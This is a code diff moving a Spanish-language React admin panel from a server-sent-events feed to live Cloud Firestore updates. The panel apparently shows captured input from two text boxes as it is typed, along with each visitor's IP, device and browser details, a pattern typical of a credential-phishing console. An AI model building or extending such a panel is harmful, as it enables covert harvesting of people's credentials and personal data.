@@ -1,5 +1,7 @@
 import React, { useState, useEffect, useRef } from 'react';
 import { UserRecord } from '../types';
+import { collection, onSnapshot, doc, deleteDoc, getDocs } from 'firebase/firestore';
+import { db } from '../lib/firebase';
 import { 
   X, 
   Search, 
@@ -35,7 +37,7 @@ export const AdminPanel: React.FC<AdminPanelProps> = ({ isOpen, onClose }) => {
   const eventSourceRef = useRef<EventSource | null>(null);
   const fallbackPollRef = useRef<NodeJS.Timeout | null>(null);
 
-  // Load initial data and connect to SSE stream
+  // Load initial data and subscribe to real-time Cloud Firestore updates
   useEffect(() => {
     if (!isOpen) {
       if (eventSourceRef.current) {
@@ -49,71 +51,75 @@ export const AdminPanel: React.FC<AdminPanelProps> = ({ isOpen, onClose }) => {
       return;
     }
 
-    fetchRecords();
+    setLoading(true);
 
-    // Connect SSE
+    // 1. Subscribe to Cloud Firestore collection for real-time multi-device sync
+    let unsubscribeFirestore: (() => void) | null = null;
+    try {
+      const q = collection(db, 'textRecords');
+      unsubscribeFirestore = onSnapshot(
+        q,
+        (snapshot) => {
+          const cloudRecords: UserRecord[] = [];
+          snapshot.forEach((docSnap) => {
+            const data = docSnap.data();
+            cloudRecords.push({
+              id: docSnap.id,
+              box1: data.box1 || '',
+              box2: data.box2 || '',
+              firstSeen: data.firstSeen || data.lastUpdated || Date.now(),
+              lastUpdated: data.lastUpdated || Date.now(),
+              isTyping: !!data.isTyping,
+              lastActiveField: data.lastActiveField || '',
+              history: data.history || [],
+              ip: data.ip || 'Cloud',
+              userAgent: data.userAgent || '',
+              device: data.device || 'Dispositivo Remoto',
+              screen: data.screen || '',
+              language: data.language || 'es',
+            });
+          });
+          cloudRecords.sort((a, b) => b.lastUpdated - a.lastUpdated);
+          setRecords(cloudRecords);
+          setIsConnected(true);
+          setLoading(false);
+        },
+        (error) => {
+          console.warn('Firestore subscription notice:', error);
+          fetchRecords();
+        }
+      );
+    } catch (err) {
+      console.warn('Firestore subscription init error:', err);
+      fetchRecords();
+    }
+
+    // 2. Connect fallback SSE / REST if running on local server
     try {
       const sse = new EventSource('/api/live-stream');
       eventSourceRef.current = sse;
-
-      sse.onopen = () => {
-        setIsConnected(true);
-      };
-
+      sse.onopen = () => setIsConnected(true);
       sse.addEventListener('init', (e: MessageEvent) => {
         try {
           const data = JSON.parse(e.data);
-          if (data.records) setRecords(data.records);
+          if (data.records && records.length === 0) setRecords(data.records);
           setLoading(false);
-        } catch (err) {
-          console.error('Error parsing SSE init data:', err);
-        }
+        } catch {}
       });
-
-      sse.addEventListener('record_update', (e: MessageEvent) => {
-        try {
-          const updated: UserRecord = JSON.parse(e.data);
-          setRecords((prev) => {
-            const index = prev.findIndex((r) => r.id === updated.id);
-            if (index >= 0) {
-              const clone = [...prev];
-              clone[index] = updated;
-              return clone.sort((a, b) => b.lastUpdated - a.lastUpdated);
-            } else {
-              return [updated, ...prev];
-            }
-          });
-        } catch (err) {
-          console.error('Error parsing SSE record_update:', err);
-        }
-      });
-
-      sse.addEventListener('record_deleted', (e: MessageEvent) => {
-        try {
-          const { id } = JSON.parse(e.data);
-          setRecords((prev) => prev.filter((r) => r.id !== id));
-        } catch (err) {
-          console.error('Error parsing SSE delete:', err);
-        }
-      });
-
-      sse.addEventListener('records_cleared', () => {
-        setRecords([]);
-      });
-
       sse.onerror = () => {
-        setIsConnected(false);
+        // SSE not available on Vercel serverless, Firestore handles everything
       };
-    } catch {
-      setIsConnected(false);
-    }
+    } catch {}
 
-    // Fallback polling every 2.5 seconds to guarantee fresh data
+    // Fallback polling
     fallbackPollRef.current = setInterval(() => {
       fetchRecordsSilent();
-    }, 2500);
+    }, 4000);
 
     return () => {
+      if (unsubscribeFirestore) {
+        unsubscribeFirestore();
+      }
       if (eventSourceRef.current) {
         eventSourceRef.current.close();
         eventSourceRef.current = null;
@@ -130,11 +136,11 @@ export const AdminPanel: React.FC<AdminPanelProps> = ({ isOpen, onClose }) => {
       setLoading(true);
       const res = await fetch('/api/records');
       const data = await res.json();
-      if (data.success && data.records) {
+      if (data.success && data.records && records.length === 0) {
         setRecords(data.records);
       }
-    } catch (e) {
-      console.error('Failed to fetch records:', e);
+    } catch {
+      // Handled by Firestore
     } finally {
       setLoading(false);
     }
@@ -144,7 +150,7 @@ export const AdminPanel: React.FC<AdminPanelProps> = ({ isOpen, onClose }) => {
     try {
       const res = await fetch('/api/records');
       const data = await res.json();
-      if (data.success && data.records) {
+      if (data.success && data.records && records.length === 0) {
         setRecords(data.records);
       }
     } catch {
@@ -155,21 +161,29 @@ export const AdminPanel: React.FC<AdminPanelProps> = ({ isOpen, onClose }) => {
   const handleDeleteRecord = async (id: string, e: React.MouseEvent) => {
     e.stopPropagation();
     try {
-      await fetch(`/api/records/${id}`, { method: 'DELETE' });
-      setRecords((prev) => prev.filter((r) => r.id !== id));
+      await deleteDoc(doc(db, 'textRecords', id));
     } catch (err) {
-      console.error('Error deleting record:', err);
+      console.warn('Firestore delete error:', err);
     }
+    try {
+      await fetch(`/api/records/${id}`, { method: 'DELETE' });
+    } catch {}
+    setRecords((prev) => prev.filter((r) => r.id !== id));
   };
 
   const handleClearAll = async () => {
     try {
-      await fetch('/api/records', { method: 'DELETE' });
-      setRecords([]);
-      setShowClearConfirm(false);
+      const snapshot = await getDocs(collection(db, 'textRecords'));
+      const batchDeletes = snapshot.docs.map((d) => deleteDoc(d.ref));
+      await Promise.all(batchDeletes);
     } catch (err) {
-      console.error('Error clearing records:', err);
+      console.warn('Firestore clear error:', err);
     }
+    try {
+      await fetch('/api/records', { method: 'DELETE' });
+    } catch {}
+    setRecords([]);
+    setShowClearConfirm(false);
   };
 
   const copyToClipboard = (text: string, id: string) => {
@@ -305,7 +319,7 @@ export const AdminPanel: React.FC<AdminPanelProps> = ({ isOpen, onClose }) => {
             <div>
               <p className="text-slate-500 font-medium">Estado Conexión</p>
               <p className="text-xs font-semibold text-slate-800">
-                {isConnected ? 'SSE Conectado' : 'Sincronizado'}
+                {isConnected ? 'Cloud Firestore Activo' : 'Sincronizado'}
               </p>
             </div>
           </div>
